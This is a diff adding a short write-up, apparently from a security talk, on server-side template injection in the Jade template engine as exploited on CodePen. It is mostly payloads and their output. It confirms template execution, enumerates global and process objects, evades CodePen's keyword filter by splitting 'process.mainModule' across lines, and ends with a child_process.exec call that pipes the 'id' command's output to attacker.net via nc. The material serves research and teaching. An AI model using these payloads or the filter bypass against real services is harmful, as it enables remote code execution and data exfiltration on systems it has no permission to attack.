@@ -1,0 +1,55 @@
+Jade
+Jade is a popular Node.js template engine. The website CodePen.io lets users submit templates in a number of languages by design, and is suitable for showing a purely blackbox exploitation process. For a visual depiction of the following steps, please refer to the presentation video (link pending).
+
+First off, confirm template execution:
+
+= 7*7
+
+49 
+Locate the self object:
+
+= root
+
+[object global] 
+Find a way to list object properties and functions:
+
+- var x = root
+- for(var prop in x)
+    , #{prop}
+
+, ArrayBuffer, Int8Array, Uint8Array, Uint8ClampedArray... global, process, GLOBAL, root
+Explore promising objects:
+
+- var x = root.process
+- for(var prop in x)
+    , #{prop}
+
+, title, version, moduleLoadList... mainModule, setMaxListeners, emit, once
+Bypass trivial countermeasures:
+
+- var x = root.process.mainModule
+- for(var prop in x)
+    , #{prop}
+
+CodePen removed the words below from your Jade because they could be used to do bad things. Please remove them and try again.
+->process
+->mainModule
+- var x = root.process
+- x = x.mainModule
+- for(var prop in x)
+    , #{prop}
+
+, id, exports, parent, filename, loaded, children, paths, load, require, _compile 
+Locate useful functions:
+
+- var x = root.process
+- x = x.mainModule.require
+- x('a')
+
+Cannot find module 'a' 
+Exploit:
+
+- var x = root.process
+- x = x.mainModule.require
+- x = x('child_process')
+= x.exec('id | nc attacker.net 80')
